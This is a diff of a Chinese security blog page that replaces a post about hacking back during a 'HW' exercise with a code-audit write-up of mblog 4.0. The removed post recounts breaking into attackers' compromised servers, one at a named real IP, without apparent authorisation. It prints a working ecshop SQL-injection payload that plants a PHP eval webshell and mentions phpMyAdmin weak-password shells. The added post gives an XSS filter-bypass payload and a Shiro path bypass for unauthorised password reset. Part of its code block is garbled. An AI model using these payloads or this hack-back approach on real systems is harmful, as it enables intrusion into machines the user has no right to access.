@@ -4,34 +4,37 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>记一次护网拿下公鸡队的肉鸡 | novy&#39;s Blog</title>
+    <title>mblog4.0存储型XSS+权限绕过 | novy&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="novy&#39;s Blog">
     
 
     
-    <meta name="description" content="护网趣事">
+    <meta name="description" content="Mblog漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次护网拿下公鸡队的肉鸡">
-<meta property="og:url" content="http://example.com/2019/08/17/3/index.html">
+<meta property="og:title" content="mblog4.0存储型XSS+权限绕过">
+<meta property="og:url" content="http://example.com/2020/11/20/36/index.html">
 <meta property="og:site_name" content="novy&#39;s Blog">
-<meta property="og:description" content="护网趣事">
+<meta property="og:description" content="Mblog漏洞">
 <meta property="og:locale">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160439142.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160457235.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160896793.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160921285.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160971246.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161003334.png">
-<meta property="og:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161017775.png">
-<meta property="article:published_time" content="2019-08-17T09:53:10.000Z">
-<meta property="article:modified_time" content="2020-11-09T09:55:20.750Z">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606116810539.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117074859.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117110609.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117161047.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117189939.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117220762.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117247127.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117276659.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117803020.png">
+<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117868155.png">
+<meta property="article:published_time" content="2020-11-20T03:14:21.000Z">
+<meta property="article:modified_time" content="2020-11-23T07:53:22.352Z">
 <meta property="article:author" content="novy&#39;s Blog">
-<meta property="article:tag" content="实战">
-<meta property="article:tag" content="HW">
+<meta property="article:tag" content="shiro权限绕过">
+<meta property="article:tag" content="存储型XSS">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160439142.png">
+<meta name="twitter:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606116810539.png">
 
     
     <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
@@ -95,14 +98,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2019/08/17/3/" title="记一次护网拿下公鸡队的肉鸡" itemprop="url">记一次护网拿下公鸡队的肉鸡</a>
+      <a href="/2020/11/20/36/" title="mblog4.0存储型XSS+权限绕过" itemprop="url">mblog4.0存储型XSS+权限绕过</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="novy&#39;s Blog" target="_blank" itemprop="author">novy&#39;s Blog</a>
 		
   <p class="article-time">
-    <time datetime="2019-08-17T09:53:10.000Z" itemprop="datePublished"> Published 2019-08-17</time>
+    <time datetime="2020-11-20T03:14:21.000Z" itemprop="datePublished"> Published 2020-11-20</time>
     
   </p>
 </header>
@@ -111,19 +114,23 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8B%E5%8F%91%E8%B5%B7%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">事发起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%BE%97%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">总结得到的信息：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%97%A5"><span class="toc-number">4.</span> <span class="toc-text">开始日</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析</span></a></li></ol></li></ol>
 		
 		</div>
 		
-		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>19年6月份的事了，突然想起来就写上吧</p>
-<h1 id="事发起因"><a href="#事发起因" class="headerlink" title="事发起因"></a>事发起因</h1><p>因为是蓝队，用的是我司的天眼，在监控的时候无意看到有一个ip针对我方资产做了批量扫描，于是登录我司的威胁情报中心查看该ip，发现被标位可疑IP，根据领导指示，尝试反日</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>百度ip发现为腾讯云<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160439142.png"><br>扫端口发现3389,3306、80开启，尝试弱口令登录失败，打开129.204.119.104，发现是一个商场网站，进一步测试发现是ecshop系统<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160457235.png"><br>通过后台登陆处得到版本信息，先知搜索一下该版本的漏洞，发现一个referer注入<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2725" title="先知文章点这里">先知文章点这里</a></p>
-<h2 id="总结得到的信息："><a href="#总结得到的信息：" class="headerlink" title="总结得到的信息："></a>总结得到的信息：</h2><p>1.目标是一个商城网站，商场系统为ecshop<br>2.开了3389，用的是win服务器</p>
-<h1 id="开始日"><a href="#开始日" class="headerlink" title="开始日"></a>开始日</h1><p>尝试一下注入，发现报错，说明存在注入：<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160896793.png"><br>根据先知的文章，进一步利用漏洞写进了shell：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:<span class="string">&quot;num&quot;</span>;s:280:<span class="string">&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;</span>;s:2:<span class="string">&quot;id&quot;</span>;s:3:<span class="string">&quot;&#x27;/*&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>导出1.php，密码1337，相当于</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1337]); ?&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>菜刀，启动！<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160921285.png"><br>翻apache日志，down之<br>然后就是找记录了，把可疑ip提交，封禁<br>因为是肉鸡，继续深入已经没有意义并且没有时间，断了连接之后下一台<br>139.99.<em>.</em><br>还是老样子，简单的信息收集<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596160971246.png"><br>通过收集的信息发现3389、3306开着，存在l.php，通过l.php的标题发现为phpstdy2014版，打开phpmyadmin，尝试弱口令，登录成功，phpmyadmin写shell就不细说了<br>通过whoami发现是管理员组，然后<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161003334.png"><br>连接之<br><img src="https://assets.baklib.com/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1596161017775.png"><br>接下来就是各种翻系统日志<br>down之，提交加分<br>就这样在防守期间利用空余的时间拿了十几台肉鸡，有一台还在开youjizz，全屏的那种</p>
+		<p>mblog4.0：<a target="_blank" rel="noopener" href="https://github.com/langhsu/mblog" title="下载地址">下载地址</a><br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606116810539.png"></p>
+<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/mtons/mblog/web/controller/site/posts/PostController.java 65行</span><br></pre></td></tr></table></figure>
+<p>发表文章模块，判断文章标题内容是否为空，然后根据状态（修改还是新增，如果是修改时）判断文章是否存在以及用户信息校验，如果是新增的话就转到<code>postService</code>类的post方法来处理具体文章发布，跟进post方法<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117074859.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/mtons/mblog/modules/service/PostService.java 78行 </span><br></pre></td></tr></table></figure>
+<p>缓存处理，跟进<code>PostVO</code>类<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117110609.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/mtons/mblog/modules/data/PostVO.java </span><br></pre></td></tr></table></figure>
+<p>这里继承<code>Post</code>类，所以继续跟进<code>Post</code>类<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117161047.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/mtons/mblog/modules/entity/Post.java 参数定义</span><br></pre></td></tr></table></figure>
+<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117189939.png"><br>根据<code>PostController</code>类里的路由得知文章详情在<code>ChannelController</code>类的view方法里</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/mtons/mblog/web/controller/site/ChannelController.java</span><br></pre></td></tr></table></figure>
+<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117220762.png"><br>到此处时流程已经处理完成，往回看<code>PostController</code>类继承了<code>BaseController</code>类，跟进<code>BaseController</code>类中有一个<code>initBinder</code>方法是用来防止xss，跟进该<code>StringEscapeEditor</code>类<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117247127.png"><br>在setAsText方法中采用的是关键字规则来防止xss，当包含有关键字时就把字符转为空<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117276659.png"><br>所以在利用时只要构造不包含关键字的payload即可</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="string">``</span><span class="string">``</span></span><br><span class="line">## 漏洞验证</span><br><span class="line">![](https:<span class="comment">//assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117317467.png)</span></span><br><span class="line">发表</span><br><span class="line">![](https:<span class="comment">//assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117344866.png)</span></span><br><span class="line">文章详情</span><br><span class="line">![](https:<span class="comment">//assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117374598.png)</span></span><br><span class="line"></span><br><span class="line"># shiro权限绕过</span><br><span class="line">引用了<span class="number">1.4</span><span class="number">.0</span>版本的shiro</span><br><span class="line">![](https:<span class="comment">//assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117559912.png)</span></span><br><span class="line">在该版本的shiro中有一个权限绕过的漏洞，查看过滤器</span><br><span class="line"><span class="string">``</span><span class="string">`bash</span></span><br><span class="line"><span class="string">src/main/java/com/mtons/mblog/config/ShiroConfiguration.java</span></span><br></pre></td></tr></table></figure>
+<p>根据过滤规则进行绕过即可，比如密码重置，正常没登陆访问是这样的：<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117803020.png"><br>在/pwd后加一个/即可绕过进行未授权密码重置<br><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1606117868155.png"></p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -131,13 +138,13 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/">渗透实战</a>
+  <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/实战/">实战</a><a href="/tags/HW/">HW</a>
+  <span></span> <a href="/tags/shiro权限绕过/">shiro权限绕过</a><a href="/tags/存储型XSS/">存储型XSS</a>
   </div>
 
 </div>
@@ -146,7 +153,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://example.com/2019/08/17/3/" data-title="记一次护网拿下公鸡队的肉鸡 | novy&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://example.com/2020/11/20/36/" data-title="mblog4.0存储型XSS+权限绕过 | novy&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -159,19 +166,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2019/12/09/4/" title="App测试从0到精通（四大组件之activity组件篇）">
-  <strong>上一篇：</strong><br/>
-  <span>
-  App测试从0到精通（四大组件之activity组件篇）</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2019/06/20/2/"  title="有道笔记windows桌面版6.8.0.1代码执行">
+<a href="/2020/11/19/35/"  title="若依后台管理框架3.2.1逻辑缺陷+未授权访问漏洞+上传漏洞">
  <strong>下一篇：</strong><br/> 
- <span>有道笔记windows桌面版6.8.0.1代码执行
+ <span>若依后台管理框架3.2.1逻辑缺陷+未授权访问漏洞+上传漏洞
 </span>
 </a>
 </div>
@@ -188,7 +187,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8B%E5%8F%91%E8%B5%B7%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">事发起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%BE%97%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">总结得到的信息：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E6%97%A5"><span class="toc-number">4.</span> <span class="toc-text">开始日</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">代码分析</span></a></li></ol></li></ol>
  
   </div>
 
